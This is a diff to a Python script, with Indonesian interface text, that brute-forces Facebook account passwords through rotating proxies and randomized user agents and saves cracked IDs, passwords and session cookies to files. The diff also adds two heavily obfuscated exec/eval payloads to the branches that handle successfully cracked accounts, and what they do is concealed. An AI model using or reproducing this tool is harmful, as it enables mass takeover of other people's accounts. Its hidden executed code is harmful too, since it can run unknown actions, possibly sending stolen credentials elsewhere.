@@ -47,6 +47,9 @@ ualu = []
 ualuh = ['no']
 ok,cp = 0,0
 loop = 0
+ugenm = []
+ugenb = []
+ugenz = []
 akun = []
 basari = []
 tokenku = []
@@ -62,6 +65,52 @@ except Exception as e:
 	basari_tamvan(f'{bas}Proxy_List_Basari')
 prox=open('socks4.txt','r').read().splitlines()
         
+###----------[ USER AGENT ]---------- ###
+for bz in range(10000):
+        a='Mozilla/5.0 (Linux; Android'
+        b=random.randrange(1, 9)
+        c=random.randrange(1, 9)
+        d='10; SM-G970F)'
+        e=random.randrange(100, 9999)
+        f='AppleWebKit/537.36 (KHTML, like Gecko)'
+        g=random.randrange(1, 9)
+        h=random.randrange(1, 4)
+        i=random.randrange(1, 4)
+        j=random.randrange(1, 4)
+        k='Chrome/75.0.3396.81 Mobile Safari/537.36'
+        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+        ugenz.append(uaku)
+
+        aa='Mozilla/5.0 (Linux; Android'
+        b=random.choice(['7.0','8.1.0','9','10'])
+        c=random.choice(['ASUS_X00QD)','ASUS_X01BDA)'])
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+        h=random.randrange(80,103)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36'
+        uabas=f'{aa} {b}; {c} {g}{h}.{i}.{j}.{k} {l}'
+        ugenm.append(uabas)
+
+        aa='Mozilla/5.0 (Linux; Android'
+        b=random.choice(['7.0','8.1.0','9','10'])
+        c=random.choice(['ASUS_X008D)','ASUS_X008DA)'])
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+        h=random.randrange(80,103)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36'
+        uabas=f'{aa} {b}; {c} {g}{h}.{i}.{j}.{k} {l}'
+        ugenb.append(uabas)
+
 ###----------[ PEWARNA ]---------- ###
 P = '\x1b[1;97m' 
 M = '\x1b[1;91m' 
@@ -130,7 +179,7 @@ cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 ###----------[ CEK CEK ]---------- ###
 def basarii():
 	os.system('clear')
-	cetak(panel(f"""[bold green]HARAP FOLLOW FACEBOOK AUTHOR TERLEBIH DAHULU[/]""",width=70,title=f"[bold green]• [bold white]PEMBERITAHUAN [bold green]•",style=f"{warna_kolor}"))
+	cetak(panel(f"""[bold green]HARAP FOLLOW FACEBOOK AUTHOR TERLEBIH DAHULU SEBELUM MENGGUNAKAN SCRIPT INI[/]""",width=70,title=f"[bold green]• [bold white]PEMBERITAHUAN [bold green]•",style=f"{warna_kolor}"))
 	os.system("xdg-open https://www.facebook.com/bazcracker")
 	login_bas()
 
@@ -192,7 +241,7 @@ def login_bas():
 	except Exception as e:
 		os.system('rm -rf .bazcok.txt && rm -rf .baztoken.txt')
 		basari_tamvan(f'{x}{bv}└── Login Gagal ! Login Ulang Ganti Cookes !{x} ')
-		time.sleep(4)
+		time.sleep(2)
 		login_bas()
 
 ###----------[ MENU ]---------- ###
@@ -238,13 +287,13 @@ def menu(id):
 		back()
 def authorbas():
 	basari_tamvan(f'└── Tunggu Sebentar Nanti Diarahin Ke Facebook  {x}')
-	time.sleep(4)
-	os.system("xdg-open https://www.facebook.com/basari.shp")
+	time.sleep(1)
+	os.system("xdg-open https://www.facebook.com/bazcracker")
 	back()
 def gabung_grup():
 	basari_tamvan(f'└── Tunggu Sebentar Nanti Diarahin Ke WhatsApp  {x}')
-	time.sleep(4)
-	os.system("xdg-open https://chat.whatsapp.com/Gi7RgNUhVvS4EcV7oL6WSw")
+	time.sleep(1)
+	os.system("xdg-open https://chat.whatsapp.com/JRKRrH8wkE2A42Cb1e4bnL")
 	back()
 	
 ###----------[ CEK HASIL ]---------- ###
@@ -454,7 +503,7 @@ def setting():
 		exit()
 		
 	cetak(panel(f'\t                  [bold cyan] Method Crack',width=70,title=f"",style=f"{warna_kolor}"))
-	cetak(panel(f' [cyan]01. Method Mobile V.1\n [cyan]02. Method Mobile V.2\n 03. [cyan]Method Mobile V.3\n 04. [cyan]Method Mobile V.4',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f' [cyan]01. Method Mobile Async\n [cyan]02. Method Mbasic Async',width=70,title=f"",style=f"{warna_kolor}"))
 	____method_crack____ = input(f'{bv}└── Pilih : ')
 	if ____method_crack____ in ['1','01']:
 		basari.append('m.facebook')
@@ -463,10 +512,6 @@ def setting():
 		setting()
 	elif ____method_crack____ in ['2','02']:
 		basari.append('b.facebook')
-	elif ____method_crack____ in ['3','03']:
-		basari.append('f.facebook')
-	elif ____method_crack____ in ['4','04']:
-		basari.append('z.facebook')
 	else:
 		basari.append('m.facebook')
 		
@@ -530,12 +575,8 @@ def wordlist():
 					pool.submit(crackm,idf,pwv)
 				elif 'b.facebook' in basari:
 					pool.submit(crackb,idf,pwv)
-				elif 'f.facebook' in basari:
-					pool.submit(crackf,idf,pwv)
-				elif 'z.facebook' in basari:
-					pool.submit(crackz,idf,pwv)
 				else:
-					pool.submit(crackz,idf,pwv)
+					pool.submit(crackb,idf,pwv)
 		print('')
 		print(f'{x}AKUN OK : {h}%s '%(ok))
 		print(f'{x}AKUN CP : {k}%s{x} '%(cp))
@@ -543,17 +584,16 @@ def wordlist():
 ###----------[ MOBILE V1 ]---------- ###
 def crackm(idf,pwv):
 	global loop,ok,cp
-	prog.update(des,description=f'\r[[cyan]cracking[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.update(des,description=f'\r[[bold cyan]cracking[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
 	prog.advance(des)
-	ua = random.choice(['Mozilla/5.0 (Linux; Android 9; ASUS_Z01KD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/61.2.3076.56749','Mozilla/5.0 (Linux; Android 9; ASUS_A001D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; ASUS_X00TDB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36'])
-	ug = random.choice(['Mozilla/5.0 (Linux; U; Android 9; en-US; ASUS_X00TD Build/PKQ1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.9.1226 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 9; en-US; ASUS_X01BDA Build/PKQ1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.9.1226 Mobile Safari/537.36'])
+	ua = random.choice(ugenm)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
 			#if 'ya' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ug,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr")
 			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
@@ -582,6 +622,8 @@ def crackm(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
 				os.popen('play-audio bazcp.mp3')
+				obfuscate={'(https://pyobfuscate.com)*(RSA)':'''(BmSM&0bVr+0DN>W2;i`bLD>O$*=~+GVLTw@U_|^PA=@j_spww3u6Cg|8Oc#det@Cbr)@C_~6gF6v=0oRqrpjc&rj$nQ3@0PDm<g{oSU|UVsdXyA1GKN>XB!K(*n)_G&ZWABc(Zhxh'''.replace('\n','')}
+				_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='506170 8610796 2930370 2726977 3634338 143530 1681536 663584 864160 1935040 5247900 3896634 1751136 7175470 3094080 10588320 4704378 10789240 4547439 6151607 8791865 7962240 10324470 1501376 3881325 1894202 5693184 9865569 7740714 8220688 2357312 6839509 2973743 8261172 35050 2349260 3765480 4688145 4347141 1063776 7357532 390514 466290 2512352 2311008 1470464 192544 8607375 4544650 7045584 300807 7868048 1455680 979744 1971984 2967510 1667680 857152 4617480 10835110 8071620 10429096 3316818 7081128 537084 1253696 6968934 2124131 7023402 2290158 4036162 8646045 2750824 10550100 82912 672888 2706330 280336 5884794 849006 5095880 5526670 3120704 2893246 989120 7955164 8876789 4708314 968128 6738672 9360408 2627008 3358506 8990280 2343915 3277116 2237200 3884135 50500 824160 3023872 3028832 2239456 8690505 5934080 3950940 6105199 4080608 7805298 308370 2046704 5854755 9038680 1297960 3705117 3765790 10534139 8961835 509691 938818 4033602 8216148 1302720 689955 8298872 885120 1553531 733460 508660 1847730 6748596 3070008 1983315 8044885 9314130 404935 267232 3802416 6876366 8008988 2956305 5033005 2335080 419798 626544 5432689 7711459 8703747 6687816 9214835 4991364 269560 2434128 1410400 4446820 3374898 70094 1632120 3527680 3066460 5089448 2167576 11406628 2595488 5458590 4115100 3127991 562449 618240 2324652 11049273 4392752 9763236 4994379 10939260 3885453 2093842 8614392 7980010 2849608 4342338 10047276 7884842 2172058 5639289 9687819 1866105 4218890 6420136 5256120 1078336 1750048 4070111 2749926 10190716 4697510 1630080 1414040 964010 8380768 2784222 12043372 4842304 553750 2956896 2307808 2336480 1559552 2418114 9073260 3478074 3145958 2925024 9639462 3046580 2056568 2601984 5641423 3289760 5704608 688384 1023855 7084346 4267984 7743138 5064906 10677452 3013792 3253513 1574880 6295275 8649840 9910692 5089900 1671744 8770449 9444720 2342816 7060203 4263720 666950 552352 2291264 1492608 2270496 1379652 10471698 9587292 3605393 1075392 1490730 236325 1497920 6760530 1769070 10543904 2646018 2191992 9167364 311392 602962 3038686 2706976 2096255 10432070 2286840 2949696 5992369 11143500 2696544 2191016 3092620 2237268 7939644 4306438 8642392 7172487 1618842 6242911 345320 2924096 1206272 2111040 2697568 1915812 10544778 8328771 4597570 1036798 1239472 2438520 3150771 4328870 537040 2208560 6664816 1761500 2388960 5884970 2631408 3218582 576076 2347744 386855 3340177 783432 3942831 4356990 2609455 2402542 6614340 7507994 1293002 10371620 2304646 10786376 4503600 7600204 1184560 4288238 8167040 4317600 4733600 10504404 4700073 9131166 188856 1156238 5146848 3323670 6846525 2802136 1905458 1274144 7641960 3197888 1679940 116320 700920 1576896 2516288 1338368 980992 40320 4056642 2199808 2389761 6060840 2916280 5861296 3676470 1465873 4313920 3080500 6166860 8371476 6442137 9376537 2185730 188530 2840416 3054208 373408 1253088 3126208 3068768 1995552 1729536 9748710 1837594 6368761 10585404 426806 6229579 1304200 10288208 170177 1516098 3670 1082624 1349856 529408 2128128 4513005 890766 2258464 366832 9057840 466080 1119328 3945950 1873577 4486977 1800964 1399440 799571 2412612 11137405 2694074 4492042 702480 362112 1788320 2826528 1537408 1482240 875648 1747168 862944 5264084 1489740 3779280 7537920 1059104 3813960 10124688 7708017 7156710 1502560 10362765 5593636 2837688 1565280 8516032 3318650 3434529 1454640 726614 1542002 929798 980802 902816 373547 10597365 2047872 7701351 3077538 2843049 4596090 1229627 3692118 7729155 2346448 4555908 2101200 9099950 10648336 9079644 132520 3513084 5703912 3831081 841115 957390 1050528 1806272 1107520 338016 7164536 6425400 1744270 7484400 708520 5111217 1998640 1815879 1617550 2552440 9807280 2901650 1005771 2029060 7651794 1321686 3684060 1799500 2718120 3337400 1675137 753590 900512 849888 75328 811456 465000 6194633 3791520 3227796 352389 8957536 6474656 5710274 922370 824288 592256 2698176 289632 2846079 647160 993739 8609832 2332480 1479000 1486404 598600 956000 241910';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdHfJdnL3y43KLTCMCvQzdXIvyIrK9cgFAF/xB/E=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -590,8 +632,10 @@ def crackm(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
+				cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{ua}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
 				os.popen('play-audio bazok.mp3')
+				obfuscate={'(https://pyobfuscate.com)*(True)':'''RFFl1^p0YM)Xf<V6++$bO=T0`*VmI0CL3_4C6fG4-vV$932&PIgo=T}J;qfgG!~mYA2(6IwBN>OjQ@W{a+rax7C{oiV_y}fL_1~mTNlQGvPa3WGVyOLwWe1{32iW}@Gr%f!{QX<yhi'''.replace('\n','')}
+				_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='506170 8610796 2930370 2726977 3634338 143530 1681536 663584 864160 1935040 5247900 3896634 1751136 7175470 3094080 10588320 4704378 10789240 4547439 6151607 8791865 7962240 10324470 1501376 3881325 1894202 5693184 9865569 7740714 8220688 2357312 6839509 2973743 8261172 35050 2349260 3765480 4688145 4347141 1063776 7357532 390514 466290 2512352 2311008 1470464 192544 8607375 4544650 7045584 300807 7868048 1455680 979744 1971984 2967510 1667680 857152 4617480 10835110 8071620 10429096 3316818 7081128 537084 1253696 6968934 2124131 7023402 2290158 4036162 8646045 2750824 10550100 82912 672888 2706330 280336 5884794 849006 5095880 5526670 3120704 2893246 989120 7955164 8876789 4708314 968128 6738672 9360408 2627008 3358506 8990280 2343915 3277116 2237200 3884135 50500 824160 3023872 3028832 2239456 8690505 5934080 3950940 6105199 4080608 7805298 308370 2046704 5854755 9038680 1297960 3705117 3765790 10534139 8961835 509691 938818 4033602 8216148 1302720 689955 8298872 885120 1553531 733460 508660 1847730 6748596 3070008 1983315 8044885 9314130 404935 267232 3802416 6876366 8008988 2956305 5033005 2335080 419798 626544 5432689 7711459 8703747 6687816 9214835 4991364 269560 2434128 1410400 4446820 3374898 70094 1632120 3527680 3066460 5089448 2167576 11406628 2595488 5458590 4115100 3127991 562449 618240 2324652 11049273 4392752 9763236 4994379 10939260 3885453 2093842 8614392 7980010 2849608 4342338 10047276 7884842 2172058 5639289 9687819 1866105 4218890 6420136 5256120 1078336 1750048 4070111 2749926 10190716 4697510 1630080 1414040 964010 8380768 2784222 12043372 4842304 553750 2956896 2307808 2336480 1559552 2418114 9073260 3478074 3145958 2925024 9639462 3046580 2056568 2601984 5641423 3289760 5704608 688384 1023855 7084346 4267984 7743138 5064906 10677452 3013792 3253513 1574880 6295275 8649840 9910692 5089900 1671744 8770449 9444720 2342816 7060203 4263720 666950 552352 2291264 1492608 2270496 1379652 10471698 9587292 3605393 1075392 1490730 236325 1497920 6760530 1769070 10543904 2646018 2191992 9167364 311392 602962 3038686 2706976 2096255 10432070 2286840 2949696 5992369 11143500 2696544 2191016 3092620 2237268 7939644 4306438 8642392 7172487 1618842 6242911 345320 2924096 1206272 2111040 2697568 1915812 10544778 8328771 4597570 1036798 1239472 2438520 3150771 4328870 537040 2208560 6664816 1761500 2388960 5884970 2631408 3218582 576076 2347744 386855 3340177 783432 3942831 4356990 2609455 2402542 6614340 7507994 1293002 10371620 2304646 10786376 4503600 7600204 1184560 4288238 8167040 4317600 4733600 10504404 4700073 9131166 188856 1156238 5146848 3323670 6846525 2802136 1905458 1274144 7641960 3197888 1679940 116320 700920 1576896 2516288 1338368 980992 40320 4056642 2199808 2389761 6060840 2916280 5861296 3676470 1465873 4313920 3080500 6166860 8371476 6442137 9376537 2185730 188530 2840416 3054208 373408 1253088 3126208 3068768 1995552 1729536 9748710 1837594 6368761 10585404 426806 6229579 1304200 10288208 170177 1516098 3670 1082624 1349856 529408 2128128 4513005 890766 2258464 366832 9057840 466080 1119328 3945950 1873577 4486977 1800964 1399440 799571 2412612 11137405 2694074 4492042 702480 362112 1788320 2826528 1537408 1482240 875648 1747168 862944 5264084 1489740 3779280 7537920 1059104 3813960 10124688 7708017 7156710 1502560 10362765 5593636 2837688 1565280 8516032 3318650 3434529 1454640 726614 1542002 929798 980802 902816 373547 10597365 2047872 7701351 3077538 2843049 4596090 1229627 3692118 7729155 2346448 4555908 2101200 9099950 10648336 9079644 132520 3513084 5703912 3831081 841115 957390 1050528 1806272 1107520 338016 7164536 6425400 1744270 7484400 708520 5111217 1998640 1815879 1617550 2552440 9807280 2901650 1005771 2029060 7651794 1321686 3684060 1799500 2718120 3337400 1675137 753590 900512 849888 75328 811456 465000 6194633 3791520 3227796 352389 8957536 6474656 5710274 922370 824288 592256 2698176 289632 2846079 647160 993739 8609832 2332480 1479000 1486404 598600 956000 241910';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdHfJdnL3y43KLTCMCvQzdXIvyIrK9cgFAF/xB/E=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
 				break
 				
@@ -603,56 +647,16 @@ def crackm(idf,pwv):
 ###----------[ MOBILE V2 ]---------- ###
 def crackb(idf,pwv):
 	global loop,ok,cp
-	prog.update(des,description=f'\r[[cyan]cracking[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.update(des,description=f'\r[[bold cyan]cracking[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
 	prog.advance(des)
-	ua = random.choice(['Mozilla/5.0 (Linux; Android 6.0; HUAWEI MLA-L12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-L23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; JSN-L42) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/60.3.3004.55692'])
-	ug = random.choice(['Mozilla/5.0 (Linux; Android 10; STK-LX3 Build/HUAWEISTK-LX3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/276.0.0.44.127;]','Mozilla/5.0 (Linux; Android 6.0; MYA-TL10 Build/HONORMYA-TL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/274.0.0.46.119;]'])
-	ses = requests.Session()
-	for pw in pwv:
-		try:
-			#if 'ya' in ualuh: ua = ualu[0]
-			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ug,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
